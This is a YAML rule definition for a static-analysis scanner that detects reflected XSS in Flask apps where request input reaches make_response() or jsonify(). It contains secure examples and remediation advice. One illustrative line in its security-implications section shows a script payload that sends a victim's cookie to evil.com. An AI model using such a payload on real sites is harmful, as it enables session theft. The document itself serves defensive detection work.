@@ -1,0 +1,255 @@
+# Rule Identity
+id: PYTHON-FLASK-SEC-015
+status: disabled  # Sandbox detection not working - disabled until rule query is fixed
+name: Flask Unsanitized Input in Response
+short_description: User input from Flask request parameters flows to make_response() or jsonify() without escaping. Sanitize HTML output with markupsafe.escape(); ensure JSON responses set the correct Content-Type to prevent browser HTML rendering.
+
+# Classification
+severity: MEDIUM
+category: flask
+language: python
+ruleset: python/flask/PYTHON-FLASK-SEC-015
+
+# Vulnerability Details
+cwe:
+  - id: CWE-79
+    name: "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+    url: https://cwe.mitre.org/data/definitions/79.html
+
+owasp:
+  - id: A03:2021
+    name: Injection
+    url: https://owasp.org/Top10/A03_2021-Injection/
+
+tags:
+  - python
+  - flask
+  - xss
+  - unsanitized-response
+  - make-response
+  - jsonify
+  - reflected-xss
+  - cross-file
+  - inter-procedural
+  - taint-analysis
+  - CWE-79
+  - OWASP-A03
+
+# Author
+author:
+  name: Shivasurya
+  url: https://x.com/sshivasurya
+
+# Content
+description: |
+  This rule detects reflected XSS in Flask applications where user-controlled input
+  from HTTP request parameters flows to make_response() or jsonify() without
+  sanitization. It covers two complementary patterns:
+
+  - make_response() with HTML content: When user input is embedded in a response body
+    and the response is served with a text/html Content-Type, the browser renders and
+    executes any HTML/JavaScript in the user-supplied content. This is the classic
+    reflected XSS pattern through the raw response API.
+
+  - jsonify() with reflected data: When user-supplied string values are included in a
+    JSON response, the risk depends on how the response is consumed. If another part
+    of the application takes this JSON and inserts its values into the DOM without
+    encoding (a common SPA pattern), the XSS occurs in the consuming client. Additionally,
+    if the response is served without the correct application/json Content-Type, some
+    browsers may interpret it as HTML.
+
+  This rule complements PYTHON-FLASK-SEC-008 (make_response specifically) with a broader
+  scope that also catches jsonify() patterns. The taint analysis traces user input from
+  Flask request sources through string operations and function calls to these response
+  functions at argument position 0. Flows through html.escape(), markupsafe.escape(),
+  Markup.escape(), or bleach.clean() are recognized as sanitizers.
+
+message: "User input flows to response without sanitization. Escape HTML with markupsafe.escape() and verify Content-Type headers prevent browser HTML rendering."
+
+security_implications:
+  - title: Reflected XSS via Direct HTML in make_response
+    description: |
+      User input embedded in make_response() HTML content executes in the victim's browser
+      when they visit the endpoint with a crafted URL. The attacker sends a link like
+      /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
+      to the victim. The Flask endpoint reflects the unescaped script tag, which the
+      browser executes, sending the victim's session cookie to the attacker.
+  - title: DOM-Based XSS via JSON Response Values
+    description: |
+      When a Flask API returns user input in a JSON response and frontend JavaScript
+      inserts that value into the DOM using innerHTML or document.write, XSS occurs
+      in the browser. For example: element.innerHTML = response.data.name. An attacker
+      who controls the name parameter injects HTML via the JSON response body, which
+      the frontend then writes to the DOM without encoding.
+  - title: JSON-Based XSS via Content-Type Mismatch
+    description: |
+      If jsonify() is used but the response's Content-Type is overridden to text/html
+      (or omitted in an older Flask version), browsers render the JSON as HTML.
+      Object keys and string values containing <script> tags execute as JavaScript.
+      This is a less common pattern but occurs when developers override Flask's default
+      Content-Type on jsonify() responses.
+  - title: Stored XSS via Persisted and Re-Reflected Values
+    description: |
+      If the user-supplied value is stored in a database and later retrieved and
+      included in a response without escaping, stored XSS occurs. Every user who
+      receives the response containing the stored payload is attacked. The taint
+      analysis traces stored-then-retrieved flows when the data flow passes through
+      recognized storage/retrieval patterns.
+
+secure_example: |
+  from flask import Flask, request, make_response, jsonify
+  from markupsafe import escape
+  import html
+
+  app = Flask(__name__)
+
+  @app.route('/greet')
+  def greet():
+      name = request.args.get('name', '')
+      # SAFE: escape() converts <, >, &, ", ' to HTML entities
+      safe_name = escape(name)
+      response = make_response(f'<html><body><p>Hello, {safe_name}!</p></body></html>')
+      response.headers['Content-Type'] = 'text/html; charset=utf-8'
+      return response
+
+  @app.route('/api/user')
+  def get_user():
+      username = request.args.get('username', '')
+      # SAFE: jsonify() sets Content-Type: application/json automatically
+      # String values in JSON do not execute as HTML/JS when Content-Type is correct
+      return jsonify({'username': username, 'status': 'ok'})
+
+  @app.route('/api/search')
+  def search():
+      query = request.args.get('q', '')
+      # SAFE for HTML contexts: html.escape() encodes special characters
+      safe_query = html.escape(query)
+      # Use the escaped version in HTML contexts; raw value is fine in JSON
+      return jsonify({'query': query, 'html_query': safe_query})
+
+recommendations:
+  - Apply markupsafe.escape() or html.escape() to every user-supplied string before inserting it into HTML content in make_response() responses.
+  - Use jsonify() for JSON API responses rather than make_response() with manually constructed JSON strings -- jsonify() sets the correct application/json Content-Type automatically.
+  - Never override the Content-Type of a jsonify() response to text/html -- this causes browsers to render JSON as HTML and execute any embedded script tags.
+  - Instruct frontend JavaScript to use textContent instead of innerHTML when inserting API response values into the DOM -- textContent treats the value as plain text and does not execute HTML.
+  - Add a Content-Security-Policy header to limit the impact of any XSS that bypasses output encoding.
+
+detection_scope: |
+  Scope: global (cross-file taint tracking across the entire project).
+
+  Sources: Flask HTTP input methods -- request.args.get(), request.form.get(),
+  request.values.get() -- which can deliver attacker-controlled strings containing
+  HTML and JavaScript payloads.
+
+  Sinks: make_response() and jsonify(). The .tracks(0) parameter targets argument
+  position 0: the response body for make_response(), and the first positional data
+  argument for jsonify(). The HTTP status code and headers arguments at other
+  positions are not tracked.
+
+  Sanitizers: escape(), markupsafe.escape(), Markup.escape(), html.escape(), and
+  bleach.clean() are recognized as sanitizers for HTML contexts. A user input value
+  that passes through any of these before reaching the response function is treated
+  as safe from HTML injection. For jsonify(), the risk is lower when Content-Type
+  is application/json, but the rule flags unsanitized flows to both sinks to catch
+  DOM-based XSS scenarios where JSON values are later inserted into the DOM.
+
+  The rule follows tainted strings through f-string interpolation, concatenation,
+  and cross-file function calls to the response construction functions.
+
+# References
+references:
+  - title: "CWE-79: Cross-site Scripting"
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - title: OWASP XSS Prevention Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+  - title: Flask make_response documentation
+    url: https://flask.palletsprojects.com/en/latest/api/#flask.make_response
+  - title: Flask jsonify documentation
+    url: https://flask.palletsprojects.com/en/latest/api/#flask.json.jsonify
+  - title: MarkupSafe documentation
+    url: https://markupsafe.palletsprojects.com/
+  - title: OWASP DOM-based XSS Prevention Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
+
+# Compliance
+compliance:
+  - standard: OWASP Top 10
+    requirement: "A03:2021 - Injection (XSS is client-side injection via response output)"
+  - standard: CWE Top 25
+    requirement: "CWE-79 ranked #2 in 2023 Most Dangerous Software Weaknesses"
+  - standard: PCI DSS v4.0
+    requirement: "Requirement 6.2.4 -- prevent XSS in all application components including API responses"
+  - standard: NIST SP 800-53
+    requirement: "SI-10: Information Input Validation; SC-28: Protection of Information at Rest"
+  - standard: ASVS v4.0
+    requirement: "V5.3.3 -- verify output encoding is context-appropriate for HTML; V5.3.6 for JSON contexts"
+
+# FAQ
+faq:
+  - question: Is jsonify() with user data a security risk?
+    answer: |
+      Directly using jsonify() on user data, the risk depends on context. jsonify()
+      sets Content-Type: application/json, so browsers will not render the JSON as HTML
+      and execute injected scripts in the response itself. The risk is in how downstream
+      code consumes the JSON -- if JavaScript inserts the values into the DOM with
+      innerHTML, XSS occurs. The rule flags jsonify() flows to ensure developers review
+      how the returned values are used in frontend code.
+
+  - question: How is this different from PYTHON-FLASK-SEC-008?
+    answer: |
+      SEC-008 focuses exclusively on make_response() used for HTML content -- where
+      XSS in the response body is the primary concern. SEC-015 has broader scope,
+      covering both make_response() and jsonify() to catch the full range of patterns
+      where unsanitized user input appears in application responses. Running both
+      rules provides complementary coverage.
+
+  - question: We use a React/Vue SPA that consumes our Flask JSON API. Does this rule apply?
+    answer: |
+      The Flask rule catches the server-side pattern (unsanitized data in responses).
+      DOM-based XSS from React/Vue components that unsafely render API data (e.g.,
+      using dangerouslySetInnerHTML) is a client-side concern. Both should be addressed:
+      escape data on the server for HTML contexts, and use textContent or safe React
+      rendering on the client.
+
+  - question: What is the difference between html.escape() and markupsafe.escape()?
+    answer: |
+      Both escape <, >, &, ", and ' to HTML entities. markupsafe.escape() returns a
+      Markup object (a subclass of str) that is marked as safe for HTML rendering --
+      Jinja2 will not double-escape it in templates. html.escape() returns a plain
+      str. For use in make_response() with manual HTML construction, both are equivalent.
+      In Jinja2 template contexts, prefer markupsafe.escape() to avoid double-escaping.
+
+  - question: Can I use json.dumps() instead of jsonify() for JSON responses?
+    answer: |
+      json.dumps() produces a JSON string but does not set the Content-Type header.
+      If you use make_response(json.dumps(data)), Flask defaults to text/html as the
+      Content-Type, causing browsers to render the JSON as HTML. Always set
+      Content-Type: application/json explicitly when using json.dumps() with
+      make_response(), or use jsonify() which does this automatically.
+
+  - question: "Does this rule fire on error response patterns like make_response({'error': user_message}, 400)?"
+    answer: |
+      Yes, if user_message traces back to a Flask request source. Error responses
+      that reflect user-supplied values (e.g., "Invalid value: " + request.args.get('x'))
+      are a common source of reflected XSS. The fix is the same: escape the value
+      for HTML contexts or ensure the response uses application/json Content-Type.
+
+  - question: How do I handle rich text input that users intend to include HTML in?
+    answer: |
+      Use bleach.clean() with an allowlist of permitted HTML tags and attributes.
+      Define the most restrictive allowlist that meets the feature requirement --
+      typically only formatting tags (b, em, u, p, ul, li) with no event handler
+      attributes and no script, iframe, or object tags. Test the allowlist against
+      OWASP's XSS filter evasion cheat sheet before deploying.
+
+# Similar Rules
+similar_rules:
+  - PYTHON-FLASK-SEC-008
+  - PYTHON-FLASK-SEC-014
+  - PYTHON-DJANGO-SEC-008
+  - PYTHON-LANG-SEC-041
+
+# Test Files
+tests:
+  positive: tests/positive/
+  negative: tests/negative/
